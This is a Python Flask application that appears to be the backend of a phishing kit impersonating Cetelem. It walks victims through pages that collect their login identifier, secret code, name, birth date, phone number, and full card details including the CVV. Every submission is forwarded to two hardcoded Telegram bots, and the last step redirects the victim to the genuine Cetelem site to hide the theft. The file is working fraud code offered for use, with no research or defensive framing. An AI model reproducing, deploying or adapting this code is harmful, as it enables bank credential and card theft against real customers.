from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

# Bot 1
TOKEN_1 = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
CHAT_ID_1 = '6297861735'

# Bot 2
TOKEN_2 = '8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs'
CHAT_ID_2 = '7650873997'


def send_to_telegram(token, chat_id, message):
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    data = {'chat_id': chat_id, 'text': message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Erreur Telegram :", e)


def send_all(message):
    send_to_telegram(TOKEN_1, CHAT_ID_1, message)
    send_to_telegram(TOKEN_2, CHAT_ID_2, message)


# Page 1 – Saisie identifiant
@app.route('/')
def identifiant():
    return render_template('identifiant.html')


# Page 2 – Enregistrement identifiant → Page code
@app.route('/code', methods=['POST'])
def code():
    identifiant = request.form.get('identifiant')
    if identifiant:
        send_all(f"[Identifiant] {identifiant}")
        return render_template('code.html')
    return redirect('/')


# Page 3 – Réception code secret → Page vérification
@app.route('/verification', methods=['GET', 'POST'])
def verification():
    if request.method == 'POST':
        try:
            code = request.get_json().get('code')
            if code:
                send_all(f"[Code] {code}")
                return redirect('/verification')
        except Exception as e:
            print("Erreur JSON:", e)
            return redirect('/')
    return render_template('verification.html')


# Page 4 – Données personnelles → Page sécurisation carte
@app.route('/securisation', methods=['POST'])
def securisation():
    nom = request.form.get('nom')
    prenom = request.form.get('prenom')
    date_naissance = request.form.get('date_naissance')
    telephone = request.form.get('telephone')

    if nom and prenom and date_naissance and telephone:
        message = (
            f"[Nom complet] {prenom} {nom}\n"
            f"[Date de naissance] {date_naissance}\n"
            f"[Téléphone] {telephone}"
        )
        send_all(message)
        return render_template('securisation.html')
    return redirect('/verification')


# Page 5 – Saisie carte → Redirection vers Cetelem après capture
@app.route('/merci', methods=['POST'])
def merci():
    carte = request.form.get('numero_carte')
    date_exp = request.form.get('date_expiration')
    cvv = request.form.get('cryptogramme')

    message = f"[Carte] {carte} | Exp: {date_exp} | CVV: {cvv}"
    send_all(message)

    return redirect("https://www.cetelem.fr/fr/accueil")


if __name__ == '__main__':
    app.run(debug=True)
